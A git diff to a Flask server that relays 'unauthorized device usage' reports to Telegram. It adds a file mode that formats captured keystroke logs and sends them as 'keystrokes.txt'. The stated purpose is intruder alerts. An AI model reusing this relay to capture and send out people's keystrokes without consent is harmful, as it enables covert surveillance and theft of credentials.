@@ -4,6 +4,8 @@ from telegram.bot import Bot
 from telegram.error import TelegramError
 from os import getenv
 import time
+import io
+import re
 
 def load_api_routes(app: Flask, *args, **kwargs) -> None:
     """
@@ -61,8 +63,8 @@ def load_api_routes(app: Flask, *args, **kwargs) -> None:
         """
         return "true"
 
-    @app.route('/api/report/breach', methods=['POST'])
-    def report_breach():
+    @app.route('/api/report/notify', methods=['POST'])
+    def report_notify():
         """
         Receive reports of unauthorized usage of devices.
         Send a message to the telegram bot associated with the key
@@ -76,6 +78,7 @@ def load_api_routes(app: Flask, *args, **kwargs) -> None:
             "false" - Some error occurred while sending message to the client
         """
         key = request.json.get('key')
+        type = request.json.get('type')
         message = request.json.get('message')
 
         # Get user by key, send message to associated user
@@ -83,9 +86,29 @@ def load_api_routes(app: Flask, *args, **kwargs) -> None:
         if user.get('user_id') is None:
             return "false"
 
+        file = None
+        if type=='file':
+            # The message first line will be sent as a message to the
+            # user, the subsequent line will be sent as a file
+            split_message = message.split('\n')
+            message = split_message[0]
+            file_content = '\n'.join(split_message[1:])
+
+            file = io.BytesIO()
+            # Do replacement just to make the final output look a bit
+            # nicer
+            file_content = file_content.replace("[SPACE]", " ")
+            file_content = file_content.replace("[ENTER]", "\n")
+            file_content = re.sub("\[(.{1})\]", "\\1", file_content)
+            file.write(file_content.encode())
+            file.seek(0)
+
         print(f'Sending message to {user.get("username")} (chat id {user.get("user_id")})')
         try:
             bot.send_message(user.get('user_id'), message)
+            if file:
+                bot.send_document(user.get('user_id'), document=file,
+                    filename='keystrokes.txt')
         except TelegramError as e:
             print('Unexpected error occurred while sending the message to the user.')
             return "false"
